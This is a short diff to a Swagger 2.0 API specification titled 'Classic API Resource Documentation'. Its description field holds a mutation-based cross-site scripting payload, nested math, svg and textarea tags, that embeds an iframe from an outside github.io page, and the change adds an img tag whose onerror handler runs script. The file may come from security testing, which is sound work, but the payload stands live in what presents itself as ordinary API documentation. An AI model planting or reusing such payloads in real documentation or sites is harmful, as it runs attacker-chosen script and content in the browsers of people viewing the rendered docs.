@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><iframe src="https://deijmaster.github.io/dvateam/"></iframe>">
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='<iframe src="https://deijmaster.github.io/dvateam/"></iframe>' onerror='alert(window.origin)'>">
     
   version: production
 basePath: /JSSResource/
